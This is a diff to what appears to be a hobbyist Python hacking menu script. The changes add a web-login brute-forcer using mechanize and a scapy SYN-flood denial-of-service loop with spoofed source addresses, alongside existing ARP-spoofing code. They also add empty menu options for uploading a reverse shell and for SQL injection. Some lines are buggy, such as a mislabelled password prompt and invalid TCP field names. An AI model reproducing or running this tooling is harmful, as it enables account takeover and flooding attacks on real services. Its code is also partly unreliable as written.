@@ -32,6 +32,8 @@ import sys
 import subprocess
 from scapy.all import *
 import scapy.all as scapy
+import mechanize
+import itertools
 
 
 #vars
@@ -60,7 +62,53 @@ def webservertests():
 	p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
 	(output, err) = p.communicate()
 	newoutput = str(output, 'UTF-8')
-	homescreen()
+
+	#anlayzing website 
+	print("[*] What would you like to do next?")
+	print("1-> brute force login")
+	print("2-> upload a reverse shell")
+	print("3-> Sql injection")
+	inputoption = input("[*] Option: ")
+	if (inputoption == "1"):
+		sleep(0.5)
+		url = input("[*] Enter url example:(http://www.example.com/login/&quot): ")
+		sleep(0.5)
+		redirecturl = input("[*] What url will it redirect to: ")
+		sleep(0.5)
+		username_field_name = input("[*] Enter the name for the username field: ")
+		sleep(0.5)
+		password_field_name = input("[*] Enter the name for the username field: ")
+		sleep(0.5)
+		username = input("[*] Please enter the username:")
+
+		br = mechanize.Browser()
+		br.set_handle_equiv(True)
+		br.set_handle_redirect(True)
+		br.set_handle_referer(True)
+		br.set_handle_robots(False)
+
+		combos = itertools.permutations("i3^4hUP-",8) 
+		br.open(url)
+		for x in combos:	
+			br.select_form( nr = 0 )
+			br.form[username_field_name] = username
+			br.form[password_field_name] = ''.join(x)
+			print("Checking " + br.form['password'])
+			response=br.submit()
+			if response.geturl()== redirecturl:
+				#url to which the page is redirected after login
+				print("Correct password is " + ''.join(x))
+				break
+
+	elif (inputoption == "2"):
+		sleep(0.5)
+	elif (inputoption == "3"):
+		sleep(0.5)
+	else:
+		sleep(0.5)
+		print("[*] Incorecct option, logging out")
+		homescreen()
+
 
 def nmapscan():
 	#asks for IP 
@@ -86,7 +134,6 @@ def nmapscan():
 def basicostests():
 	sleep(0.5)
 	print("[*] Not redy yet, Check agian later")
-	homescreen()
 	homescreen()
 
 
@@ -120,6 +167,7 @@ def basicnettests():
 		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
 		(output, err) = p.communicate()
 		newoutput = str(output, 'UTF-8')
+		print(newoutput)
 		print("[*] What is your subnetmask?")
 		print("[*] Ex: 192.168.1.0/24")
 		subnetmask = input("[*] Subnetmask: ")
@@ -131,6 +179,7 @@ def basicnettests():
 		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
 		(output, err) = p.communicate()
 		newoutput = str(output, 'UTF-8')
+		print(newoutput)
 		otherip = input("Enter IP of device wanted to spoof: ")
 		sleep(0.5)
 		arp_request=scapy.ARP(pdst=otherip)
@@ -165,7 +214,23 @@ def basicnettests():
 		
 	if (inputchoice == "2"):
 		sleep(0.5)
-		print("[*] Starting Dos...")
+		print("[*] Starting SYN Flooding..")
+		sleep(2)
+		target_port = 80
+		src_IP =  RandIP()
+
+		#writing layeers
+		ip = scapy.IP(src = src_IP, dst = IPadders)
+		tcp = scapy.TCP(src_port = RandShort(), dst_port = target_port, flags = "S")
+		raw = Raw(b"X"*1024)
+
+		#combining layers into the packet
+		p = ip / tcp / raw
+
+		#loop of sending the packet
+		send(p, loop=1, verbose=0)
+		homescreen()
+			
 
 def basicwebtests():
 	#sending packets
@@ -236,13 +301,3 @@ print("[*] What interface are you using?")
 interface = input("[*] Interface: ")
 sleep(0.5)
 homescreen()
-
-
-
-
-
-
-
-
-
-#end the code
